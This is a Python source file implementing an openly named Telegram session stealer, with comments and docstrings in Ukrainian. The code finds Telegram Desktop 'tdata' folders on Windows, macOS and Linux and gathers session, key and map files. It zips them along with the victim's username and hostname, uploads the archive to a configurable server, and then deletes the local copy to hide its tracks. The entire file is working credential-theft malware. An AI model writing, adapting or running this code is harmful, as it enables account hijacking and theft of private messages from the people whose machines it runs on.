# client/stealer.py
import os
import sys
import json
import zipfile
import requests
import platform
from pathlib import Path
import logging
import requests


class TelegramStealer:
    def __init__(self, config):
        self.config = config
        self.collected_data = []
        self.setup_logging()
    
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def steal_telegram_data(self):
        """Пошук Telegram даних"""
        try:
            # Шляхи до Telegram
            telegram_paths = self.get_telegram_paths()
            
            for path_name, path in telegram_paths.items():
                if path and os.path.exists(path):
                    self.logger.info(f"Searching in {path_name}: {path}")
                    self.collect_from_path(path, path_name)
                else:
                    self.logger.warning(f"Path not found: {path_name}")
                    
        except Exception as e:
            self.logger.error(f"Error stealing Telegram data: {e}")
    
    def get_telegram_paths(self):
        """Отримання шляхів до Telegram"""
        system = platform.system()
        paths = {}
        
        if system == "Windows":
            # Windows paths
            appdata = os.getenv('APPDATA')
            local_appdata = os.getenv('LOCALAPPDATA')
            
            # Telegram Desktop
            paths['telegram_desktop'] = os.path.join(appdata, 'Telegram Desktop', 'tdata')
            paths['telegram_android'] = os.path.join(local_appdata, 'Telegram', 'Telegram Data')
            
        elif system == "Darwin":  # macOS
            home = str(Path.home())
            paths['telegram_desktop'] = os.path.join(home, 'Library', 'Application Support', 'Telegram Desktop', 'tdata')
            paths['telegram_android'] = os.path.join(home, 'Library', 'Application Support', 'Telegram')
            
        else:  # Linux
            home = str(Path.home())
            paths['telegram_desktop'] = os.path.join(home, '.local', 'share', 'TelegramDesktop', 'tdata')
            paths['telegram_android'] = os.path.join(home, '.local', 'share', 'Telegram')
        
        return paths
    
    def collect_from_path(self, path, path_name):
        """Збір даних з шляху"""
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Збираємо тільки важливі файли
                    if self.is_important_file(file_path):
                        self.collect_file(file_path, path_name)
                        
        except Exception as e:
            self.logger.error(f"Error collecting from {path}: {e}")
    
    def is_important_file(self, file_path):
        """Перевірка чи файл важливий"""
        important_extensions = ['.session', '.dat', '.json', '.key', 'map']
        important_names = ['tdata', 'D877', 'D877F783', 'user_data']
        
        filename = os.path.basename(file_path)
        
        # Перевірка розширення
        if any(filename.endswith(ext) for ext in important_extensions):
            return True
        
        # Перевірка імені
        if any(name in filename for name in important_names):
            return True
            
        # Перевірка шляху
        if 'tdata' in file_path.lower():
            return True
            
        return False
    
    def collect_file(self, file_path, source):
        """Додавання файлу до колекції"""
        try:
            file_size = os.path.getsize(file_path)
            
            self.collected_data.append({
                'path': file_path,
                'source': source,
                'size': file_size,
                'content': self.read_file_safely(file_path)
            })
            
            self.logger.info(f"Collected: {file_path} ({file_size} bytes)")
            
        except Exception as e:
            self.logger.error(f"Error collecting file {file_path}: {e}")
    
    def read_file_safely(self, file_path):
        """Безпечне читання файлу"""
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except:
            return b''
    
    def create_archive(self):
        """Створення ZIP архіву"""
        try:
            archive_path = 'collected_data.zip'
            
            with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Додаємо конфігурацію
                config_data = json.dumps(self.config, indent=2)
                zipf.writestr('config.json', config_data)
                
                # Додаємо файли
                for item in self.collected_data:
                    arcname = f"data/{item['source']}/{os.path.basename(item['path'])}"
                    zipf.writestr(arcname, item['content'])
            
            self.logger.info(f"Archive created: {archive_path}")
            return archive_path
            
        except Exception as e:
            self.logger.error(f"Error creating archive: {e}")
            return None
    
    def send_to_server(self, archive_path):
        """Відправка даних на сервер"""
        try:
            with open(archive_path, 'rb') as f:
                files = {'file': (os.path.basename(archive_path), f, 'application/zip')}
                data = {
                    'admin_id': self.config.get('admin_id'),
                    'client_id': self.get_client_info()
                }
                
                response = requests.post(
                    self.config.get('server_url'),
                    files=files,
                    data=data,
                    timeout=30
                )
                
                if response.status_code == 200:
                    self.logger.info("Data sent successfully")
                    return True
                else:
                    self.logger.error(f"Server error: {response.status_code}")
                    return False
                    
        except Exception as e:
            self.logger.error(f"Error sending data: {e}")
            return False
    
    def get_client_info(self):
        """Отримання інформації про клієнта"""
        return {
            'system': platform.system(),
            'machine': platform.machine(),
            'username': os.getenv('USERNAME') or os.getenv('USER'),
            'hostname': platform.node()
        }
    
    def run(self):
        """Головна функція"""
        self.logger.info("Starting Telegram stealer...")
        
        # Збираємо дані
        self.steal_telegram_data()
        
        if not self.collected_data:
            self.logger.warning("No data collected")
            return False
        
        # Створюємо архів
        archive_path = self.create_archive()
        if not archive_path:
            return False
        
        # Відправляємо на сервер
        success = self.send_to_server(archive_path)
        
        # Чистимо за собою
        try:
            if os.path.exists(archive_path):
                os.remove(archive_path)
        except:
            pass
        
        return success

def main():
    """Точка входу для стіллера"""
    try:
        # Завантажуємо конфігурацію
        config_path = 'config.json'
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                config = json.load(f)
        else:
            # Конфігурація за замовчуванням (для тесту)
            config = {
                'server_url': 'http://localhost:5000/api/upload',
                'admin_id': '1',
                'target_admin': 'admin'
            }
        
        # Запускаємо стілер
        stealer = TelegramStealer(config)
        success = stealer.run()
        
        sys.exit(0 if success else 1)
        
    except Exception as e:
        logging.error(f"Stealer error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()